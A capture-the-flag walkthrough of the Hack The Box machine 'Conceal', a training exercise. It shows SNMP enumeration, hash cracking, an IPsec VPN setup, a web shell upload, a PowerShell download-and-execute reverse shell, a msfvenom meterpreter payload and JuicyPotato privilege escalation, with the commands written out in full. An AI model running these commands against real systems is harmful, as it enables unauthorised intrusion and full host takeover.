# [Conceal](https://app.hackthebox.com/machines/conceal)

```bash
nmap -p- -sU --min-rate 5000 10.10.10.116 -Pn
```

![Alt text](img/image.png)


Let's look at SNMP to find secrets via `snmpwalk` command.
```bash
snmpwalk -v 2c -c public 10.10.10.116
```

![Alt text](img/image-1.png)


I grab hash from here, and paste into [Crackstation](https://crackstation.net/)

HASH: 9C8B1A372B1878851BE2C097031B6E43

![Alt text](img/image-2.png)


Now, I need to configure IPSEC VPN between target and my machine.

Here's file '/etc/ipsec.conf'.

![Alt text](img/image-3.png)


Here's '/etc/ipsec.secrets'.

![Alt text](img/image-4.png)

Then, I restart and configuration goes into place.

```bash
ipsec restart
ipsec up conceal
```


Now, let's do `nmap` enumeration.

```bash
nmap -p- -sT --min-rate 10000 10.10.10.116 -Pn
```

![Alt text](img/image-5.png)


Let's do directory enumeration.

```bash
gobuster dir -u http://10.10.10.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,aspx,asp,html   
```

![Alt text](img/image-6.png)


Also, I enumerate FTP service and see that this FTP service is served through HTTP service.

![Alt text](img/image-7.png)


note.txt file can be seen.

![Alt text](img/image-8.png)


I tried so many web shell payloads by uploading into here, but `.asp` file can be seen.

I take a webshell from [here](https://github.com/tennc/webshell/blob/master/asp/webshell.asp).

![Alt text](img/image-9.png)


I can read user.txt means proof.txt from here by doing `dir` commands.

proof.txt

![Alt text](img/image-10.png)


I added my reverse shell script into 'Invoke-PowerShellTcp.ps1'.
```bash
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 1337" >> Invoke-PowerShellTcp.ps1
```

![Alt text](img/image-11.png)


1.Then, I open HTTP server to serve this script.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```

![Alt text](img/image-12.png)

2.Then, on my webshell, I execute this script.
```bash
powershell iex(New-Object Net.Webclient).downloadstring('http://10.10.16.6:8080/Invoke-PowerShellTcp.ps1')
```

![Alt text](img/image-13.png)



I got reverse shell from port (1337)..

![Alt text](img/image-14.png)


I looked at privileges of this user via `whoami /priv` command.

![Alt text](img/image-15.png)


I see that `SeImpersonatePrivilege` is enabled, let's abuse this.

1.First, I need to create malicious `.exe` file.
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.6 LPORT=1338 --arch x64 -f exe > dr4ks.exe
```
![Alt text](img/image-16.png)

2.Then, I open http server.
```bash
python3 -m http.server --bind 10.10.16.6 8080
```
![Alt text](img/image-18.png)

3.Then, download this files via `wget` command.
```bash
wget http://10.10.16.6:8080/JuicyPotato.exe -outfile JuicyPotato.exe
wget http://10.10.16.6:8080/dr4ks.exe -outfile dr4ks.exe
```

![Alt text](img/image-17.png)


Let's execute the payload as below.

```bash
./JuicyPotato.exe -l 1338 -p dr4ks.exe -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

![Alt text](img/image-19.png)

I got reverse shell from port (1338).

![Alt text](img/image-20.png)


root.txt

![Alt text](img/image-21.png)